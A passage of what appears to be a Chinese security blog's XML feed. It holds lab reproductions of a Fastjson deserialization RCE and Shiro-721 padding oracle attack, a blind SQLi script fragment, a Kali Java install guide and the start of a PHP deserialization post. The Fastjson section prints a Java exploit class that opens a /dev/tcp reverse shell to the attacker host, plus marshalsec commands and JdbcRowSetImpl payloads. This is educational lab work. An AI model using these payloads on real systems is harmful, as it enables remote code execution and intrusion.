requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;PZ-CAP&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装java8</title>
    <url>/posts/6cf74356/</url>
    <content><![CDATA[<h3 id="官网下载"><a href="#官网下载" class="headerlink" title="官网下载"></a>官网下载</h3><p><code>https://www.oracle.com/technetwork/java/javase/downloads/index.html</code> 选择下载java8 最新版为<code>jdk-8u291-linux-x64.tar.gz</code></p>
<h3 id="Jdk-传到kali并解压"><a href="#Jdk-传到kali并解压" class="headerlink" title="Jdk 传到kali并解压"></a>Jdk 传到kali并解压</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">mv jdk-8u291-linux-x64.tar.gz &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">sudo tar -zxvf jdk-8u281-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="安装并注册"><a href="#安装并注册" class="headerlink" title="安装并注册"></a>安装并注册</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_291&#x2F;bin&#x2F;java 1</span><br><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_291&#x2F;bin&#x2F;javac 1</span><br><span class="line">update-alternatives --set java &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_291&#x2F;bin&#x2F;java</span><br><span class="line">update-alternatives --set javac &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_291&#x2F;bin&#x2F;javac</span><br></pre></td></tr></table></figure>

<h3 id="查看java版本"><a href="#查看java版本" class="headerlink" title="查看java版本"></a>查看java版本</h3><p><code>java -version</code></p>
<blockquote>
<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
<p>java version “1.8.0_291”<br>Java(TM) SE Runtime Environment (build 1.8.0_291-b10)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.291-b10, mixed mode)</p>
</blockquote>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化复现</title>
    <url>/posts/37afa0e0/</url>
    <content><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>fastjson 是一款阿里的开源java库，用来实现java 对象与json字符串之间的相互转化</p>
<p>反序列化常用的两种利用方式，一种是基于rmi(Java远程方法调用)，一种是基于ldap。</p>
<p>@type处可以做反序列化 做反序列化时会调用对象的set方法<br>使用 JdbcRowSetImpl 从远程服务器上加载服务器端的类 从而执行恶意代码</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机 vulhub-fastjson-1.2.24</p>
<p>ip：192.168.20.128</p>
<p>kali：192.168.20.129</p>
<p><code>docker-compose up -d</code> 访问<code>192.168.20.128:8090</code></p>
<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><h5 id="DNSLog回显"><a href="#DNSLog回显" class="headerlink" title="DNSLog回显"></a>DNSLog回显</h5><p>构造POST请求包，fastjson可以解析payload中val的值，如果dnslog有回显即为fastjson</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:0</span><br></pre></td></tr></table></figure>

<br>

<h4 id="RMI方式"><a href="#RMI方式" class="headerlink" title="RMI方式"></a>RMI方式</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ol>
<li>靶机为vulhub8090端口</li>
<li>kali上利用python开启web服务，并把编译后的exp放到里面</li>
<li>kali 8001端口开启 rmi 服务（rmi 远程方法调用  A主机去调用B主机上的exp.class方法）</li>
<li>kali 8888端口监听反弹的shell</li>
</ol>
<h5 id="使用kali搭建一个临时web服务"><a href="#使用kali搭建一个临时web服务" class="headerlink" title="使用kali搭建一个临时web服务"></a>使用kali搭建一个临时web服务</h5><p><code>python3 -m http.server 9999</code></p>
<h5 id="编译生产exp-放在web目录下"><a href="#编译生产exp-放在web目录下" class="headerlink" title="编译生产exp,放在web目录下"></a>编译生产exp,放在web目录下</h5><p>Exploit.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.20.129/8888 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行编译<code>javac Exploit.java</code>生成Exploit.class</p>
<p>把编译好的Exploit.class放在kali上</p>
<h5 id="kali监听8888端口"><a href="#kali监听8888端口" class="headerlink" title="kali监听8888端口"></a>kali监听8888端口</h5><p><code>nc -lvvp 8888</code></p>
<h5 id="启动RMI服务"><a href="#启动RMI服务" class="headerlink" title="启动RMI服务"></a>启动RMI服务</h5><p>使用marshalsec项目，启动RMI服务，监听8001端口并加载远程类Exploit.class(marshalsec和编译后的Exploit.class放在同一目录下)</p>
<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8001</code></p>
<blockquote>
<p>kali@kali2020:~/Common/fastjson$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://192.168.20.129:9999/#Exploit&quot;">http://192.168.20.129:9999/#Exploit&quot;</a> 8001<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
<ul>
<li>Opening JRMP listener on 8001<br>Have connection from /192.168.20.128:49126<br>Reading message…<br>Is RMI.lookup call for Exploit 2<br>Sending remote classloading stub targeting <a href="http://192.168.20.129:9999/Exploit.class">http://192.168.20.129:9999/Exploit.class</a><br>WARNING: An illegal reflective access operation has occurred<br>WARNING: Illegal reflective access by marshalsec.util.Reflections (file:/home/kali/Common/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar) to field com.sun.jndi.rmi.registry.ReferenceWrapper.wrappee<br>WARNING: Please consider reporting this to the maintainers of marshalsec.util.Reflections<br>WARNING: Use –illegal-access=warn to enable warnings of further illegal reflective access operations<br>WARNING: All illegal access operations will be denied in a future release<br>Closing connection</li>
</ul>
</blockquote>
<p>原因貌似是因为java版本过高，这里默认使用的我昨天刚安装的javac11,换一个低版本的javac去进行编译,但是还是无法反弹shell.</p>
<p>查了半个下午，最终发现是因为kali 的java版本问题，kali原java版本为java11,然后安装了java8 再去开启rmi服务就正常了</p>
<p><img src="/posts/37afa0e0/rmi1.png"></p>
<p>成功反弹shell</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>1.2.24 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.47</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="LDAP方式"><a href="#LDAP方式" class="headerlink" title="LDAP方式"></a>LDAP方式</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8002</code></p>
<p><img src="/posts/37afa0e0/ldap1.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.20.129:8002&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.cnblogs.com/chen-w/p/14735881.html">https://www.cnblogs.com/chen-w/p/14735881.html</a></p>
<p><a href="https://blog.csdn.net/weixin_45556536/article/details/109486621">https://blog.csdn.net/weixin_45556536/article/details/109486621</a></p>
<p><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
<p><a href="https://www.yuque.com/naraku/blog/leak-fastjson">https://www.yuque.com/naraku/blog/leak-fastjson</a></p>
</blockquote>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro721复现</title>
    <url>/posts/700536f4/</url>
    <content><![CDATA[<h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>shiro采用了AES-128-CBC的模式对cookie进行加密，这种加密方式可以使用Padding Oracle Attack( Oracle 填充攻击 ) ,用户可以通过这种方式构造恶意的RememberMe字段，并重新请求网站，进行反序列化攻击，从而达到任意代码执行.</p>
<p>影响版本: Apache Shiro  1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1版本</p>
<br>

<br>

<h3 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h3><p>AES/128/CBC/PKCS5Padding 加密</p>
<p>AES是一款对称加密 ,分组加密算法，这个书上有介绍过，不过最近书没在旁边，参考了下师傅们博客 </p>
<p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
<h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>AES的加密标准中，每个分组的 长度固定为128bits(16Bytes)，密钥长度为128bits,192bits,256bits,不同的密钥长度有不同的加密轮数,根据长度不同可以分为AES-128,AES-192,AES-256.</p>
<table>
<thead>
<tr>
<th>AES加密</th>
<th>密钥长度</th>
<th>分组长度</th>
<th>加密轮数</th>
</tr>
</thead>
<tbody><tr>
<td>AES-128</td>
<td>128bits</td>
<td>128bits</td>
<td>10</td>
</tr>
<tr>
<td>AES-192</td>
<td>192bits</td>
<td>128bits</td>
<td>12</td>
</tr>
<tr>
<td>AES-256</td>
<td>256bits</td>
<td>128bits</td>
<td>14</td>
</tr>
</tbody></table>
<h4 id="加密步骤"><a href="#加密步骤" class="headerlink" title="加密步骤"></a>加密步骤</h4><p>初始轮        </p>
<ul>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p>普通轮        </p>
<ul>
<li>字节替换    （SubBytes）</li>
<li>行位移（ShiftRows）</li>
<li>列混淆（MixColumns）</li>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p>最终轮        </p>
<ul>
<li>字节替换 （SubBytes）</li>
<li>行位移 （ShiftRows）</li>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p>具体加密步骤详解如下</p>
<h5 id="字节替换（SubBytes）"><a href="#字节替换（SubBytes）" class="headerlink" title="字节替换（SubBytes）"></a>字节替换（SubBytes）</h5><p>AES 字节替换的过程可以理解为一个查表的过程,AES提供了S盒和逆S盒，</p>
<p>字节的高四位作为行，字节底四位为列值，然后根据s盒中的对应的值作为输出，图中给出例如，加密时输出的字节S1为0x12，查S盒的第1行 ，第2列，得到的值为 0xc9</p>
<p>0xAB，查S盒第A行，第B列，得到值为0x62</p>
<p><img src="/posts/700536f4/s.png"></p>
<p><img src="/posts/700536f4/%5Es.png"></p>
<p><img src="/posts/700536f4/SubBytes.png"></p>
<p><img src="/posts/700536f4/SubBytes2.png"></p>
<h5 id="行位移（ShiftRows）"><a href="#行位移（ShiftRows）" class="headerlink" title="行位移（ShiftRows）"></a>行位移（ShiftRows）</h5><p>行位移，可以理解为左循环移位的操作</p>
<p><img src="/posts/700536f4/ShiftRows.png"></p>
<p><img src="/posts/700536f4/ShiftRows2.PNG"></p>
<p>行位移的逆变换相反，为左循环位移</p>
<h5 id="列混淆（MixColumns）"><a href="#列混淆（MixColumns）" class="headerlink" title="列混淆（MixColumns）"></a>列混淆（MixColumns）</h5><p>列混合变换  就是矩阵相乘,行位移后的状态矩阵盒固定矩阵相乘</p>
<p><img src="/posts/700536f4/MixColumns.png"></p>
<h5 id="轮密钥加（AddRoundKey）"><a href="#轮密钥加（AddRoundKey）" class="headerlink" title="轮密钥加（AddRoundKey）"></a>轮密钥加（AddRoundKey）</h5><p>轮密钥加时i将128为的轮密钥Ki和相同状态的矩阵中的数据逐位进行异或运算</p>
<p><img src="/posts/700536f4/AddRoundKey.png"></p>
<p>a[i,j]与k[i,j]异或，输出b[i,j]</p>
<br>

<h4 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h4><p>AES分组加密的加密模式，共五种可选加密模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECS ( Electronic Codebook Book , 电话本模式 )</span><br><span class="line">CBC ( Cipher Block Chaining , 密码分组链接模式 )</span><br><span class="line">CTR ( Counter , 计算器模式 )</span><br><span class="line">CFB ( Cipher FeedBack , 密码反馈模式 )</span><br><span class="line">OFB ( Output FeedBack , 输出反馈模式 )</span><br></pre></td></tr></table></figure>

<p>在shiro中使用的为CBC的加密模式，</p>
<blockquote>
<p>CBC加密模式: 将明文切分成若干小段 , 然后每一段分别与上一段的密文进行异或运算 , 再与密钥进行加密 , 生成本段明文的密文 , 这段密文用于下一段明文的加密</p>
<p>第一段明文没有对应的密文，保证分组的唯一性，CBC加密模式使用了初始化向量（IV , Initialization Vector）初始化向量是一个固定长度的随机数 , 该向量会作为密文第一个块 , 随密文一同传输 .</p>
<p>在 CBC 模式中 , 初始化向量( IV ) 的长度与分组大小相同 , 为 16 Bytes( 128 bits ) , 因为链接模式中的异或操作是等长操作</p>
</blockquote>
<p><img src="/posts/700536f4/aes_Cbc_encryption-squashed.jpg"></p>
<p><img src="/posts/700536f4/aes_Cbc_decryption.png"></p>
<h5 id="加密模式对应的填充方式"><a href="#加密模式对应的填充方式" class="headerlink" title="加密模式对应的填充方式"></a>加密模式对应的填充方式</h5><p>填充有六种：NoPadding, PKCS#5, PKCS#7, ISO 10126, ANSI X9.23和ZerosPadding</p>
<ul>
<li><p>Nopadding</p>
<p>  不进行填充</p>
</li>
<li><p>PKCS#7 &amp; PKCS#5</p>
<p>  缺少几个字节就填充几个字节，值为填充的字节数  </p>
</li>
</ul>
<blockquote>
<p>例如,AAAAAAAA  BBBBBBBB CCCCCCCC    刚好分成3个分组<br>        AAAAAAAA  BBBBBBBB CCCCC            缺少3个字节 所以使用 0x03进行填充<br>       (这里例子的A B C 均视为一个字节)</p>
</blockquote>
<blockquote>
<p>不同在于PKCS5限定了块大小为8bytes而PKCS7没有限定，在AES加密当中严格来说是不能使用pkcs5的，因为AES的块大小是16bytes而pkcs5只能用于8bytes，通常我们在AES加密中所说的pkcs5指的就是pkcs7！    —-在知乎上看到的</p>
</blockquote>
<ul>
<li><p>ISO 10126</p>
<p>  最后一个字节是填充的字节数（包括最后一字节），其他全部填随机数</p>
</li>
</ul>
<blockquote>
<p>直接引用师傅的例子</p>
<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 | … </p>
</blockquote>
<ul>
<li><p>ANSI X9.23</p>
<p>  和ISO 10126差不多，最后一个字节是填充的字节数，区别在 这种方法填充的其他字节都是0，而不是随机数</p>
</li>
<li><p>ZerosPadding</p>
<p>  缺少的字节全部使用 <code>0x00</code>填充</p>
</li>
</ul>
<br>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>AES加密大体上有所了解了，再回到shiro上来，看一下 AES/CBC/PKCS5Padding 即可</p>
<p><img src="/posts/700536f4/PKCS5Padding.png"></p>
<br>

<h4 id="Padding-Oracle-Attack-填充-Oracle-攻击"><a href="#Padding-Oracle-Attack-填充-Oracle-攻击" class="headerlink" title="Padding Oracle Attack( 填充 Oracle 攻击 )"></a>Padding Oracle Attack( 填充 Oracle 攻击 )</h4><p>是指使用密文的填充验证信息来进行解密的攻击方法,也就是通过加密数据解密后验证填充是否正确的方式</p>
<p>例如</p>
<p>用户去请求 <code>http://www.example.com?id=xxxxxxxxxxx</code></p>
<p>服务端接收客户端发送的数据后，会对参数值进行AES解密处理:</p>
<ul>
<li>密文无效        =&gt;    用户不存在。返回http 500</li>
<li>密文有效,填充有效        =&gt;    用户存在，登陆成功。返回htto 200</li>
<li>密文有效,填充无效        =&gt;    自定义报错。返回http 30X</li>
</ul>
<p>所以可以通过对填充进行爆破来确定有效的填充值</p>
<br>

<p><img src="/posts/700536f4/aes_Cbc_decryption.png"></p>
<p>Ciphertext通过Key解密为Midvalue,然后midvalue和IV进行异或处理得到Plaintext</p>
<p>那可以去创建一个FuzzIV 让它与Midvalue进行异或运算，得到Plaintext后再去验证填充是否有效</p>
<p>PKCS5Padding 中 padding的有效范围为0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 到 0x08 0x08 0x08 0x08 0x08 0x08 0x08 0x08 之间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FuzzIV[i] ^ Midvalue[i] &#x3D; 0x01  &#x3D;&gt; Midvalue[i] &#x3D; FuzzIV[i] ^ 0x01</span><br><span class="line"> &#x3D;&#x3D;&#x3D;&gt;</span><br><span class="line">IV[i] ^ Midvalue[i] &#x3D; Plaintext[i] &#x3D;&gt; Plaintext[i] &#x3D; IV[i] ^ FuzzIV[i] ^ 0x01</span><br></pre></td></tr></table></figure>

<p>最终得到 <code>Plaintext[i] = IV[i] ^ FuzzIV[i] ^ 0x01</code>, 而IV和FuzzIV是已知的，所以可以得到Plaintext的值,这就是 Padding Oracle Attack 的攻击原理</p>
<br>

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>获取dockfile</p>
<p><code>git clone https://github.com/3ndz/Shiro-721.git</code><br><code>cd Shiro-721/Docker</code></p>
<p>构建并运行</p>
<p><code>docker build -t shiro-721 .  </code></p>
<p><code>docker run -p 8080:8080 -d shiro-721</code></p>
<p>尝试登录  root/secret，勾选RememberMe</p>
<p><img src="/posts/700536f4/login_success_rem.png"></p>
<p>可以看到 <code>Set-Cookie: rememberMe=deleteMe</code></p>
<br>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>使用burp抓取rememberMe</p>
<p><img src="/posts/700536f4/exp1.png"></p>
<p>需要爆破很长时间… …用了半个多小时…</p>
<p><img src="/posts/700536f4/exp2.png"></p>
<p><img src="/posts/700536f4/exp3.png"></p>
<p>最终成功反弹shell</p>
<br>

<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
<li>升级 Shiro版本</li>
<li>使用waf拦截过于频繁访问的ip</li>
<li>使用waf拦截Cookie中长度过大的RememberMe值</li>
<li>升级jdk版本</li>
</ul>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/">https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/14077791.html">https://www.cnblogs.com/backlion/p/14077791.html</a></p>
<p><a href="https://www.yuque.com/m1tang/gqsay7/qwegln">https://www.yuque.com/m1tang/gqsay7/qwegln</a></p>
<p><a href="https://www.bilibili.com/video/BV1yX4y1V75c">https://www.bilibili.com/video/BV1yX4y1V75c</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
<p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/131324301">https://zhuanlan.zhihu.com/p/131324301</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo首页只显示部分摘要（不显示全文）</title>
    <url>/posts/2825537d/</url>
    <content><![CDATA[<p>在next主题d_config.yml中更改设置(默认安装时就打开了)</p>
<blockquote>
<p># Automatically excerpt description in homepage as preamble text.</p>
<p>excerpt_description: true</p>
</blockquote>
<p>在文章的md中可以添加<code>description: &#39;&#39;</code>其中里面的内容就会显示在首页上 如果向这样填写，就不会在页面上显示东西。</p>
<br>

<p>这次突然有两个页面全部加载在了主页上，看了下是没有添加description的原因</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/posts/7c19cc12/</url>
    <content><![CDATA[<h3 id="序列化-与-反序列化"><a href="#序列化-与-反序列化" class="headerlink" title="序列化 与 反序列化"></a>序列化 与 反序列化</h3><p>序列化: 把对象转换为字符序列的过程<br>反序列化: 把字符序列恢复为对象的过程  </p>
<p><code>serialize()</code><br><code>unserialize()</code></p>
<h3 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a - array                 	b - boolean  </span><br><span class="line">d - double                 	i - integer</span><br><span class="line">o - common object         	r - reference</span><br><span class="line">s - string                 	C - custom object</span><br><span class="line">O - class                  	N - null</span><br><span class="line">R - pointer reference      	U - unicode string</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;Dog&#x27;</span>, <span class="string">&#x27;Cat&#x27;</span>, <span class="string">&#x27;Zard&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = serialize(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;Dog&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;Zard&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Show_info</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span>  <span class="keyword">$this</span>-&gt;name .<span class="string">&#x27; is &#x27;</span>. <span class="keyword">$this</span>-&gt;age .<span class="string">&#x27;years old.&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$s</span>-&gt;name = <span class="string">&#x27;Mamor&#x27;</span> ;</span><br><span class="line"><span class="variable">$s</span>-&gt;age = <span class="number">21</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Show_info();</span><br><span class="line"></span><br><span class="line">print_r(serialize(<span class="variable">$s</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">print_r(unserialize(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Mamor&quot;;s:3:&quot;age&quot;;i:21;&#125;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Mamor is <span class="number">21</span>years old.</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Mamor&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span 